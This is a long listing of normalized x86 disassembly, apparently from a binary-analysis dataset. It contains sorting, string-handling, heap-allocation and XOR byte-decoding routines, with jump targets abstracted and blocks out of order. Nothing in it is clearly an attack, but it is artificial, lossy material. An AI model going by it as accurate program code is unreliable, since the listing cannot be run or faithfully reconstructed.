jne r-xdata
mov eax [ edi ]
mov ecx [ ebx - 0x4 ]
push eax
push ecx
call [ ebp + 0x14 ]
add esp 0x8
test eax eax
jne r-xdata
add esi 0x4
cmp esi [ ebp + 0x10 ]
jb r-xdata
mov edx [ edi ]
mov eax [ esi ]
push edx
push eax
call [ ebp + 0x14 ]
add esp 0x8
test eax eax
jne r-xdata
add esi 0x4
cmp esi [ ebp + 0x10 ]
jb r-xdata
mov ecx [ edi ]
mov edx [ edi - 0x4 ]
push ecx
push edx
call [ ebp + 0x14 ]
add esp 0x8
test eax eax
jne r-xdata
sub ebx 0x4
cmp esi [ ebp + 0x10 ]
jne r-xdata
cmp esi [ ebp + 0x10 ]
je r-xdata
add ebx 0xfffffffc
cmp [ ebp + 0xc ] ebx
jb r-xdata
mov edx [ ebx - 0x4 ]
mov eax [ edi ]
push edx
push eax
call [ ebp + 0x14 ]
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ esi ]
mov eax ecx
add ecx 0x4
mov [ ebp - 0x4 ] ecx
mov ecx [ eax ]
mov [ eax ] edx
mov [ esi ] ecx
mov edx [ edi ]
mov eax [ esi ]
mov ebx [ ebp + 0x14 ]
push edx
push eax
call ebx
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esi ]
mov ecx [ ebx ]
mov [ esi ] ecx
mov [ ebx ] eax
add esi 0x4
jmp r-xdata
sub edi 0x4
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ eax ] edi
pop edi
pop esi
mov [ eax + 0x4 ] edx
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp eax esi
je r-xdata
cmp ebx [ ebp + 0xc ]
mov ecx [ ebx - 0x4 ]
mov eax [ edi - 0x4 ]
sub edi 0x4
mov [ edi ] ecx
mov [ ebx - 0x4 ] eax
cmp esi [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax - 0x4 ]
mov ecx [ edi ]
sub eax 0x4
mov [ edi ] edx
mov [ ebp - 0x4 ] eax
mov [ eax ] ecx
jmp r-xdata
mov edx [ edi ]
mov eax [ ebx ]
mov [ ebx ] edx
mov [ edi ] eax
mov ecx edi
mov edx [ ecx ]
add eax 0x4
mov [ ebp - 0x4 ] eax
mov eax esi
mov [ ebp - 0x8 ] edx
mov edx [ eax ]
mov [ ecx ] edx
mov ecx [ ebp - 0x8 ]
add edi 0x4
add esi 0x4
mov [ eax ] ecx
jmp r-xdata
mov edx [ eax ]
mov ecx [ edi ]
mov [ edi ] edx
mov [ eax ] ecx
sub_10044159
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ esi ] 0x1
push [ ebp + 0x8 ]
call sub_1006b489
mov ecx 0xffff
cmp cx ax
jne r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10044190
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
pop esi
jmp eax
sub_100441c4
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_10037958
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_10010183
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_1004fd82
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x18
sub_10044240
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
xor eax eax
push esi
push edi
mov ebx ecx
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
cmp [ ebp + 0x10 ] eax
jl r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
jg r-xdata
mov ecx ebx
call sub_10024530
mov edi edx
mov esi eax
test edi edi
jl r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x1c ]
mov ecx ebx
call edx
or edx 0xffffffff
cmp eax edx
je r-xdata
jg r-xdata
lea esp [ esp ]
mov ecx [ ebp + 0x8 ]
inc ecx
add [ esp + 0x10 ] 0x1
mov [ ecx - 0x1 ] al
mov [ ebp + 0x8 ] ecx
adc [ esp + 0x14 ] 0x0
add [ ebp + 0xc ] edx
adc [ ebp + 0x10 ] edx
mov eax [ ebp + 0x10 ]
cmp eax edi
jg r-xdata
test esi esi
je r-xdata
jl r-xdata
mov eax [ ebx + 0x20 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
push esi
push ecx
push edx
call sub_100796a0
add [ ebp + 0x8 ] esi
mov eax [ ebx + 0x30 ]
add esp 0xc
add [ esp + 0x10 ] esi
adc [ esp + 0x14 ] edi
sub [ ebp + 0xc ] esi
sbb [ ebp + 0x10 ] edi
sub [ eax ] esi
mov eax [ ebx + 0x20 ]
add [ eax ] esi
jmp r-xdata
jl r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
mov esi [ ebp + 0xc ]
mov edi eax
cmp [ ebp + 0xc ] esi
jae r-xdata
sub_10044320
push ebp
mov ebp esp
push ecx
xor eax eax
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push eax
add edx 0xcc
mov [ esi ] cx
push edx
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_10019180
mov eax esi
mov esp ebp
pop ebp
retn
sub_1004435a
push 0xc
push r--data
call sub_10079bf0
call sub_10023e95
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_10079111
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10044390
mov eax [ ebp - 0x1c ]
call sub_10079c35
retn
sub_100443a0
push ebp
mov ebp esp
push 0xffffffff
push sub_10082336
mov eax [ fs : 0x0 ]
push eax
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push 0x208
xor ebx ebx
lea ecx [ ebp - 0x26c ]
push ebx
push ecx
mov [ ebp - 0x284 ] eax
call sub_10079a10
add esp 0xc
lea ecx [ ebp - 0x26c ]
call sub_10048a90
cmp eax ebx
je r-xdata
push 0x144
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x270 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0xb2
call sub_10013830
lea eax [ ebx + 0x1 ]
jmp r-xdata
xor eax eax
push eax
call sub_1004d9c0
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
lea edi [ ebp - 0x270 ]
call sub_1000d540
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x274 ]
cmp esi ebx
je r-xdata
or edi 0xffffffff
mov [ ebp - 0x4 ] edi
push eax
lea ecx [ ebp - 0x278 ]
mov [ ebp - 0x278 ] ebx
mov [ ebp - 0x274 ] ebx
call sub_1003b340
mov [ ebp - 0x4 ] 0x1
mov esi [ ebp - 0x278 ]
cmp esi ebx
jne r-xdata
lea ecx [ ebp - 0x26c ]
push ecx
lea esi [ ebp - 0x278 ]
mov [ ebp - 0x270 ] ebx
call sub_10018d10
test eax eax
je r-xdata
lea edx [ ebp - 0x54 ]
mov eax 0xa2
call sub_10013830
lea eax [ ebp - 0x278 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10044190
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
lea edx [ esi + 0x4 ]
mov eax edi
[ edx ] eax
jne r-xdata
mov ebx [ ebp - 0x278 ]
call sub_1003ae80
test eax eax
je r-xdata
lea edx [ ebp - 0x64 ]
mov eax 0xa8
call sub_10013830
mov [ ebp - 0x270 ] 0x4
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov edx [ ebp - 0x284 ]
push edx
lea edi [ ebp - 0x278 ]
call sub_1004c6a0
test eax eax
je r-xdata
lea edx [ ebp - 0x64 ]
mov eax 0x50
call sub_10013830
mov [ ebp - 0x270 ] 0x5
jmp r-xdata
mov eax [ ebp - 0x27c ]
test eax eax
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0x62
call sub_10013830
mov [ ebp - 0x270 ] 0xa
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov ebx [ ebp - 0x278 ]
lea eax [ ebp - 0x27c ]
xor esi esi
push eax
lea ecx [ ebp - 0x280 ]
mov [ ebp - 0x27c ] esi
mov [ ebp - 0x280 ] esi
call sub_1001b560
test eax eax
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0xd5
call sub_10013830
mov [ ebp - 0x270 ] 0x6
jmp r-xdata
mov esi [ ebp - 0x278 ]
call sub_1001d390
test eax eax
je r-xdata
lea eax [ ebp - 0x278 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10044190
mov eax [ ebp - 0x270 ]
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
lea edi [ ebp - 0x280 ]
lea ecx [ ebp - 0x27c ]
call sub_1003c110
test eax eax
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0x10d
call sub_10013830
mov [ ebp - 0x270 ] 0x7
jmp r-xdata
mov ecx [ ebp - 0x280 ]
mov edx [ ebp - 0x27c ]
push ecx
push edx
lea eax [ ebp - 0x26c ]
call sub_10031770
add esp 0x8
cmp eax esi
je r-xdata
lea edx [ ebp - 0x54 ]
mov eax 0xe9
call sub_10013830
mov [ ebp - 0x270 ] 0x8
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0x138
call sub_10013830
lea eax [ ebp - 0x278 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10044190
mov eax 0x9
jmp r-xdata
sub_100446ad
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_100446e0
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0xc ]
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax ecx
jb r-xdata
push r--data
call sub_10050437
sub eax ecx
cmp eax ebx
jae r-xdata
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ebx eax
test ebx ebx
je r-xdata
push r--data
call sub_1002c5ed
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push edi
lea edi [ eax + ebx ]
mov [ ebp - 0x4 ] edi
cmp edi 0x7ffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_1002c5ed
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_1004d170
test edi edi
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x8
jb r-xdata
pop edi
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
xor edx edx
pop edi
mov [ eax ] dx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ esi ]
xor edx edx
pop edi
mov [ eax ] dx
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
mov edx 0x8
cmp [ eax + 0x14 ] edx
jb r-xdata
mov eax [ ebp + 0xc ]
lea edx [ eax + ebx ]
test eax eax
jne r-xdata
mov edx [ esi + 0x10 ]
push edx
lea edi [ ebx + ebx ]
push ecx
add eax edi
push eax
call sub_1001bb10
mov eax [ ebp + 0x8 ]
add esp 0xc
cmp esi eax
jne r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov edx eax
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] edx
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
xor edx edx
mov [ eax + ecx * 2 ] dx
mov eax [ esi ]
xor edx edx
pop edi
mov [ eax + ecx * 2 ] dx
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp + 0xc ]
push edi
lea ecx [ ecx + edx * 2 ]
push ecx
push eax
call sub_100796a0
push ebx
lea ecx [ ecx + edx * 2 ]
mov eax esi
push ecx
push eax
call sub_1001bb10
jmp r-xdata
mov eax [ esi ]
push ebx
lea ecx [ ecx + edx * 2 ]
push ecx
push eax
call sub_1001bb10
jmp r-xdata
cmp eax 0x8
jb r-xdata
mov ecx [ ebp - 0x4 ]
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] ecx
jb r-xdata
sub_10044860
push ebp
mov ebp esp
push 0xffffffff
push sub_10081302
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ecx [ ebx + 0x4 ]
cmp edi ecx
jae r-xdata
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov eax [ ebx ]
cmp eax edi
ja r-xdata
mov esi [ ebx + 0x4 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x1
mov ecx ebx
call sub_1002adc0
sub edi eax
mov eax 0x88888889
imul edi
add edx edi
sar edx 0x5
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ ebx + 0x8 ]
jne r-xdata
add [ ebx + 0x4 ] 0x3c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
call sub_1004bf40
mov ecx [ ebx ]
mov eax esi
shl eax 0x4
sub eax esi
mov esi [ ebx + 0x4 ]
lea edi [ ecx + eax * 4 ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx ebx
call sub_1002adc0
test esi esi
je r-xdata
sub_1004490f
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1000317e
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_100449e0
push ebp
mov ebp esp
push 0xffffffff
push sub_10080848
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x10 ]
mov eax edi
call sub_10039ac0
mov eax [ edi + 0x4 ]
push eax
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10044a40
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ecx + 0x14 ]
push esi
mov esi eax
mov eax [ ecx + 0x10 ]
mov edx [ esi + 0x10 ]
sub ebx eax
mov [ ebp - 0x4 ] 0x0
cmp edx ebx
jbe r-xdata
push 0xffffffff
push 0x0
push esi
call sub_10043930
xor edx edx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
push eax
mov ecx edi
mov [ edi ] dx
call sub_10036380
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ esi + 0x14 ]
sub ebx edx
cmp ebx eax
jb r-xdata
push 0x0
push ecx
or eax 0xffffffff
call sub_100446e0
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] cx
push eax
mov ecx edi
call sub_10036380
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn
sub_10044ad0
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
cmp [ esi + 0x40 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x40 ] 0x7
mov [ esi + 0x3c ] 0x0
mov [ esi + 0x2c ] cx
cmp [ esi + 0x20 ] 0x8
jb r-xdata
mov eax [ esi + 0x2c ]
push eax
call sub_1006591f
add esp 0x4
xor eax eax
test [ ebp + 0x8 ] 0x1
mov [ esi + 0x20 ] 0x7
mov [ esi + 0x1c ] 0x0
mov [ esi + 0xc ] ax
je r-xdata
mov edx [ esi + 0xc ]
push edx
call sub_1006591f
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
add esp 0x4
sub_10044b40
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10044b90
push ebp
mov ebp esp
push 0xffffffff
push sub_100825aa
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + edi + 0x38 ]
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x1c ] edi
cmp ecx ebx
je r-xdata
mov [ ebp - 0x4 ] ebx
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
cmp [ eax + edi + 0xc ] ebx
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov eax [ edi ]
mov eax [ eax + 0x4 ]
cmp [ eax + edi + 0xc ] ebx
sete cl
mov [ ebp - 0x18 ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
jne r-xdata
mov eax [ eax + edi + 0x3c ]
cmp eax ebx
je r-xdata
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x2
mov ecx [ eax + edi + 0x38 ]
mov edx [ ecx ]
mov eax [ ebp + 0xc ]
mov edx [ edx + 0x24 ]
push ebx
push esi
push eax
call edx
cmp eax esi
jne r-xdata
mov edx 0x4
jmp r-xdata
mov esi eax
call sub_100537f0
mov [ ebp - 0x14 ] 0x4
cmp edx ebx
je r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
add ecx edi
test edx edx
je r-xdata
mov edx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0x4
call j_sub_100680ab
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ edi ]
mov edx [ ecx + 0x4 ]
mov ecx [ edx + edi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx edi
call sub_10060a10
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
or eax 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
push 0x0
call sub_1003c700
sub_10044c4b
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
or eax 0x4
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
push 0x1
call sub_1003c700
sub_10044d00
push ebp
mov ebp esp
push 0xffffffff
push sub_1008199a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x180
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx ecx
cmp [ ebx + 0xec ] 0x0
mov edi edx
mov [ ebp - 0x178 ] eax
mov [ ebp - 0x180 ] edi
jne r-xdata
push 0x10
lea ecx [ edi + 0x24 ]
lea esi [ ebp - 0x164 ]
call sub_10041110
add esp 0x4
mov ecx [ ebp - 0x180 ]
xor edx edx
mov [ ebp - 0x4 ] edx
mov eax [ edi + 0x24 ]
mov ecx [ ecx + 0x34 ]
push eax
push ecx
mov edi 0xf
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x30 ] dl
call sub_10043190
mov eax [ ebp - 0x178 ]
mov edx esi
push edx
push eax
lea ecx [ ebp - 0x68 ]
push ecx
mov [ ebp - 0x4 ] 0x1
call sub_1002a990
add esp 0xc
lea ecx [ ebp - 0x30 ]
lea esi [ ebp - 0xbc ]
mov [ ebp - 0x4 ] 0x2
call sub_1006bcb0
mov esi 0x10
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov eax 0x42
jmp r-xdata
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x68 ] 0x0
mov [ ebp - 0x4 ] 0x5
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov edx [ ebp - 0x68 ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0xbc ]
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0xa8 ] esi
jae r-xdata
mov eax [ ebp - 0x30 ]
push eax
call sub_1006591f
add esp 0x4
mov edx [ ebp - 0xac ]
call sub_1004a310
push 0x5
lea esi [ ebp - 0x174 ]
mov edi ebx
mov [ ebp - 0x178 ] eax
call sub_10023b00
mov [ ebp - 0x4 ] 0x6
push 0x2
push r--data
lea ecx [ ebp - 0xd8 ]
mov [ ebp - 0xc4 ] 0xf
mov [ ebp - 0xc8 ] 0x0
mov [ ebp - 0xd8 ] 0x0
call sub_10043190
mov [ ebp - 0x4 ] 0x7
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
jne r-xdata
lea ecx [ ebp - 0xbc ]
push esi
lea eax [ ebp - 0x174 ]
call sub_1004c5f0
push eax
push ebx
lea edi [ ebp - 0xd8 ]
call sub_1001a220
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
push r--data
call sub_10050437
push esi
push ebx
lea eax [ ebp - 0x174 ]
call sub_1000e9c0
lea ecx [ ebp - 0xbc ]
push ecx
lea edx [ ebp - 0x110 ]
push r--data
push edx
mov [ ebp - 0x180 ] eax
call sub_100430c0
add esp 0xc
mov [ ebp - 0x4 ] 0x8
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
push r--data
call sub_10050437
lea eax [ esi + 0x1c ]
push eax
lea eax [ ebp - 0x174 ]
call sub_1004c5f0
push eax
push ebx
lea edi [ ebp - 0x110 ]
call sub_1001a220
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
ja r-xdata
push r--data
call sub_10050437
lea eax [ esi + 0x1c ]
push eax
push ebx
lea eax [ ebp - 0x174 ]
call sub_1000e9c0
mov edx [ ebp - 0x178 ]
push edx
lea esi [ ebp - 0x68 ]
mov [ ebp - 0x188 ] eax
call sub_10062430
push eax
lea eax [ ebp - 0xf4 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x9
call sub_10021390
add esp 0x10
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x54 ] 0x10
jb r-xdata
push r--data
call sub_10050437
mov ecx [ ebp - 0x170 ]
mov edi [ ebp - 0x174 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov esi 0xf
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x68 ] 0x0
cmp eax 0x2
ja r-xdata
mov ecx [ ebp - 0x68 ]
push ecx
call sub_1006591f
add esp 0x4
lea eax [ edi + 0x38 ]
push eax
lea eax [ ebp - 0x174 ]
call sub_1004c5f0
push eax
push ebx
lea edi [ ebp - 0xf4 ]
call sub_1001a220
mov ecx [ ebp - 0x170 ]
mov edi [ ebp - 0x174 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x2
ja r-xdata
push r--data
call sub_10050437
lea eax [ edi + 0x38 ]
push eax
push ebx
lea eax [ ebp - 0x174 ]
call sub_1000e9c0
push 0x1
push r--data
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x178 ] eax
mov [ ebp - 0x8c ] esi
mov [ ebp - 0x90 ] 0x0
mov [ ebp - 0xa0 ] 0x0
call sub_10043190
mov [ ebp - 0x4 ] 0xc
cmp [ ebx ] 0x0
push 0x1
lea ecx [ ebp - 0xa0 ]
jne r-xdata
push r--data
call sub_10050437
push r--data
push r--data
jmp r-xdata
lea eax [ esi + 0x54 ]
push eax
lea eax [ ebp - 0x174 ]
call sub_1004c5f0
push eax
push ebx
lea edi [ ebp - 0xa0 ]
call sub_1001a220
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x3
ja r-xdata
push r--data
call sub_10050437
call sub_10067f90
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
lea eax [ esi + 0x54 ]
push eax
push ebx
lea eax [ ebp - 0x174 ]
call sub_1000e9c0
push 0x24ac4
lea esi [ ebp - 0x68 ]
mov [ ebp - 0x184 ] eax
call sub_1006a2d0
push eax
lea edx [ ebp - 0x12c ]
push r--data
push edx
mov [ ebp - 0x4 ] 0xd
